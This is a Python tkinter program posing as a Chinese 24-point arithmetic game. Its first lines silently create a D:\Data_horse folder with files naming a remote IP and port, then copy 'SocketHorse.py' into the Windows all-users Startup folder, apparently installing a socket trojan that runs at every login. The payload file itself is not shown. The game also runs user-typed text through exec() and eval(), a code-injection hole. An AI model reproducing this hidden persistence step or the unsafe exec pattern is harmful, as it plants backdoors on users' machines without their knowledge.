import tkinter as tk
from tkinter import messagebox
import random
from ttkthemes import ThemedTk
import os
import shutil

# 定义要创建的文件夹路径
folder_path = r'D:\Data_horse'

# 使用os.makedirs()创建文件夹
# exist_ok=True表示如果文件夹已经存在，不会抛出异常
os.makedirs(folder_path, exist_ok=True)

print(f"文件夹 {folder_path} 已创建")
open(r"D:\Data_horse\Data.SQL_horse", "w").write("version:1.0.0\npathD:\Data_horse\nData=[]")
open(r"D:\Data_horse\start_run.py", "w")
open(r"D:\Data_horse\ins.SQL_horse", "w").write('ins={\n"ip":"192.168.10.21",\n"port":8082\n}')
open(r"D:\Data_horse\log.SQL_horse", "w")

# 源文件路径
source_file = 'SocketHorse.py'

# 目标目录路径
destination_dir = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'

shutil.copy(source_file, destination_dir)

out = True

def cal24(nums):
    for i in range(4):
        for j in range(4):
            for k in range(4):
                for l in range(4):
                    if i != j and i != k and i != l and j != k and j != l and k != l:
                        a, b, c, d = nums[i], nums[j], nums[k], nums[l]
                        for op1 in "+-*/":
                            for op2 in "+-*/":
                                for op3 in "+-*/":
                                    try:
                                        res = eval(f"({a}{op1}{b}){op2}({c}{op3}{d})")
                                        if abs(res - 24) < 1e-6:
                                            return f"({a}{op1}{b}){op2}({c}{op3}{d})"
                                    except ZeroDivisionError:
                                        pass
    return None

def on_calculate():
    global out
    try:
        nums = [int(x) for x in entry.get().split(' ')]
    except ValueError:
        messagebox.showerror("错误", "程序报啦:\n    类型错误，请尝试重新输入")
        return None
    result = cal24(nums)
    if result and out:
        messagebox.showinfo("计算结果(示例)：", result)
    elif not out:
        messagebox.showerror("错误", "正在计算中(我是不会告诉你答案的QWQ)")
    else:
        messagebox.showerror("错误", "无解")

def update_label(text):
    text_var.set(text)

def on_new_question():
    global out
    global nums
    if out:
        out = False
        nums = generate_question()
        entry.delete(0, tk.END)
        entry.insert(0, ' '.join(map(str, nums)))
        new_question_button.config(text="开始验算")
        update_label("数字：")
        entry.config(state="disabled")
        entry2.config(state="normal")
    else:
        global input_

        entry_numbers = entry2.get().replace(" ", "").replace("+", "").replace("-", "").replace("*", "").replace("/", "").replace("(", "").replace(")", "").replace("（", "").replace("）", "")
        input_ = None
        try:
            exec("global input_\ninput_ = " + entry2.get().replace("（", "(").replace("）", ")"))
        except SyntaxError:
            messagebox.showerror("错误", "程序报啦:\n    类型错误，请尝试重新输入")
        if input_ == 24 and len(entry_numbers) == 4 and int(entry_numbers[0]) in nums and int(entry_numbers[1]) in nums and int(entry_numbers[2]) in nums and int(entry_numbers[3]) in nums:
            messagebox.showinfo("恭喜", "计算正确了！")
            out = True
            new_question_button.config(text="点击出题(你来算算？)")
            update_label("请输入数字并用空格分离：")
            entry.config(state="normal")
            entry.delete(0, tk.END)
            entry2.delete(0, tk.END)
            entry2.config(state="disabled")
        elif not input_ == None:
             messagebox.showerror("错误", "答案错误")

def generate_question():
    return_ = [1, 1, 1, 1]
    while not cal24(return_):
        return_ = []
        return_ =  [random.randint(1, 9) for _ in range(4)]
    return return_
root = ThemedTk(theme='arc')
root.title("24点计算工具")

root.configure(bg='lightblue')
label_font = ('Arial', 12)
entry_font = ('Arial', 12)
button_font = ('Arial', 12)

text_var = tk.StringVar()
text_var.set("请输入数字并用空格分离：")

label = tk.Label(root, textvariable=text_var, font=label_font, bg='lightblue')
label.place(x=45, y=0)

entry = tk.Entry(root, font=entry_font)
entry.place(x=50, y=25)

label2 = tk.Label(root, text="请输入算式：", font=label_font, bg='lightblue')
label2.place(x=45, y=50)

entry2 = tk.Entry(root, font=entry_font)
entry2.place(x=50, y=75)
entry2.config(state="disabled")

button = tk.Button(root, text="开始计算", command=on_calculate, width=20, height=3, font=button_font, bg='lightblue')
button.place(x=50, y=200)

new_question_button = tk.Button(root, text="点击出题(你来算算？)", command=on_new_question, width=20, height=3, font=button_font, bg='lightblue')
new_question_button.place(x=50, y=125)

label = tk.Label(root, text=None, bg='lightblue')

root.geometry("275x300")
root.resizable(0, 0)

root.mainloop()
